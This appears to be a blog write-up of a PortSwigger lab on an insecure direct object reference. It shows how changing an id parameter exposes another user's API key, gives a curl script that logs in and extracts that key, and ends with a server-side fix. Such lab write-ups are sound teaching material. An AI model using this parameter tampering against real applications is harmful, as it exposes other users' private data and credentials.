---
layout: post
title: "PortSwigger: User ID Controlled by Request Parameter"
date: 2027-09-24 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, AccessControl]
tags: [portswigger, access-control, broken-access-control, idor, horizontal-privilege-escalation, insecure-direct-object-reference, cwe-639]
---

The last few labs were about gaining *more* privilege than you should have — flipping a role to admin. This one is the other flavour of broken access control: staying at your own privilege level but reaching *sideways* into another user's data. It's a textbook [Insecure Direct Object Reference (IDOR)](https://cwe.mitre.org/data/definitions/639.html) — [CWE-639](https://cwe.mitre.org/data/definitions/639.html), authorization bypass through a user-controlled key.

## Overview

The lab gives you a normal account (`wiener:peter`). The objective: find the API key belonging to another user, `carlos`, and submit it.

## The tell

Log in and look at the URL of your account page:

```
GET /my-account?id=wiener
```

Your username is sitting in the `id` parameter, and the page it returns contains *your* API key. That parameter is the entire access-control decision: the server uses it to pick which account record to load — and it never checks that the `id` you asked for is actually the account you're logged in as.

## The attack

There is no filter to bypass and nothing to brute-force, because the identifier is just a username and we already know the victim's name. Change one word:

```
GET /my-account?id=carlos
```

sent with **your own** `wiener` session cookie. The server happily returns carlos's account page — including his API key:

```
Your API Key is: 7nspb5DZbQKNKXjqIB0k9bTym7ltltDx
```

Submitting that key solves the lab.

With `curl`:

```bash
# 1. Log in as wiener (grab the login CSRF token first)
csrf=$(curl -s -c cookies.txt "$URL/login" | grep -oP 'name="csrf" value="\K[^"]+')
curl -s -b cookies.txt -c cookies.txt -d "csrf=$csrf&username=wiener&password=peter" "$URL/login"

# 2. IDOR — read carlos's account with wiener's session
curl -s -b cookies.txt "$URL/my-account?id=carlos" | grep -oP 'Your API Key is: \K[^<]+'
```

## Why it worked

Authentication and authorization are two separate checks, and this app only does the first one. The session cookie proves you are *a* valid user, but the code then trusts a value from the request — the `id` parameter — to decide *whose* record to return. Because:

- the identifier is a guessable username (not an unpredictable, opaque token), and
- there is no server-side check that the requested record belongs to the caller,

any logged-in user can read any other user's data by editing a single parameter. This is **horizontal** privilege escalation: you don't gain admin, you just reach another peer's resources.

## The fix

Never let the client choose *whose* data to load. Derive the identity from the session on the server and ignore any contradicting `id` in the request:

```python
# vulnerable — trusts the request parameter
account = Account.get(id=request.args["id"])

# fixed — scoped to the authenticated user
account = Account.get(id=session["user_id"])
```

If a record genuinely must be addressed by ID, enforce a server-side ownership check on every object reference (`record.owner == session.user`) and deny by default. Using long, unguessable IDs raises the bar a little, but it is defence-in-depth — not a substitute for the authorization check.
